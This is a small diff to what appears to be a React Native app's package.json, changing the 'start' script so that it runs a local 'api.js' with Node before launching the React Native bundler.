@@ -4,7 +4,7 @@
   "private": true,
   "main": "index.js",
   "scripts": {
-    "start": "react-native start",
+    "start": "node api.js && react-native start",
     "android": "react-native run-android",
     "ios": "react-native run-ios --scheme UnderdawgsScratch",
     "build:android": "cd android && ./gradlew assembleRelease",
